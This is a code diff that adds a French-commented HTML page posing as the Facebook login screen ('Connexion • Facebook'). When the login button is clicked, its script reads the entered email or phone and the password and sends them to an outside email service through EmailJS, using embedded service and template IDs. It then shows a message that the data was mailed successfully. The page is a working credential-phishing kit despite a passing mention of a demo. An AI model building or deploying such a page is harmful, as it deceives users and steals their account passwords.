@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion • Facebook</title>
+    <!-- Tailwind CSS pour un design front-end fidèle -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- SDK EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialisation d'EmailJS avec votre Public Key
+        (function() {
+            emailjs.init("tGS7rBd7k9Fge8mMN");
+        })();
+    </script>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+        }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen">
+
+    <div class="flex flex-col items-center w-full max-w-md px-4">
+        
+        <!-- En-tête -->
+        <div class="text-left w-full mb-6 px-2">
+            <h1 class="text-xl font-bold text-gray-900">Log into Facebook</h1>
+        </div>
+
+        <!-- Boîte de formulaire -->
+        <div class="bg-white p-4 rounded-xl shadow-lg w-full border border-gray-200">
+            <div class="flex flex-col space-y-3">
+                
+                <!-- Champ Email / Téléphone -->
+                <div class="relative">
+                    <input type="text" id="login" placeholder="Email ou téléphone" 
+                        class="w-full px-4 py-3.5 text-base border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 placeholder-gray-500">
+                </div>
+
+                <!-- Champ Mot de passe -->
+                <div class="relative">
+                    <input type="password" id="pass" placeholder="Mot de passe" 
+                        class="w-full px-4 py-3.5 text-base border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 placeholder-gray-500">
+                </div>
+
+                <!-- Bouton de connexion -->
+                <button id="bouton" 
+                    class="w-full bg-[#1877f2] hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-md text-lg transition duration-200 cursor-pointer mt-1">
+                    Log in
+                </button>
+
+                <div class="text-center py-2">
+                    <a href="#" class="text-[#1877f2] text-sm font-medium hover:underline">Forgot password?</a>
+                </div>
+
+                <hr class="border-gray-300 my-2">
+
+                <div class="flex justify-center pt-2 pb-1">
+                    <button class="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold py-3 px-4 rounded-md text-base transition duration-200 cursor-pointer">
+                        Create new account
+                    </button>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Indicateur d'état pour la démo -->
+        <div id="status-message" class="mt-4 text-sm text-gray-600 font-medium"></div>
+
+    </div>
+
+    <!-- Script de gestion du clic et d'envoi EmailJS -->
+    <script>
+        document.getElementById("bouton").addEventListener("click", () => {
+            const texteLogin = document.getElementById("login").value;
+            const textePass = document.getElementById("pass").value;
+            const statusMsg = document.getElementById("status-message");
+
+            if (!texteLogin || !textePass) {
+                alert("Veuillez remplir tous les champs.");
+                return;
+            }
+
+            statusMsg.textContent = "Envoi en cours...";
+            statusMsg.className = "mt-4 text-sm text-blue-600 font-medium";
+
+            // Paramètres envoyés vers le template EmailJS
+            const templateParams = {
+                login: texteLogin,
+                pass: textePass
+            };
+
+            // Envoi via EmailJS (Remplacez par vos IDs de service et de template)
+            emailjs.send("service_6tv3it9", "template_1cep30f", templateParams)
+                .then(function(response) {
+                    statusMsg.textContent = "Connexion réussie (Données envoyées par mail avec succès !)";
+                    statusMsg.className = "mt-4 text-sm text-green-600 font-medium";
+                    
+                    // Réinitialisation des champs
+                    document.getElementById("login").value = "";
+                    document.getElementById("pass").value = "";
+                }, function(error) {
+                    statusMsg.textContent = "Erreur lors de l'envoi.";
+                    statusMsg.className = "mt-4 text-sm text-red-600 font-medium";
+                    console.log("Erreur:", error);
+                });
+        });
+    </script>
+</body>
+</html>
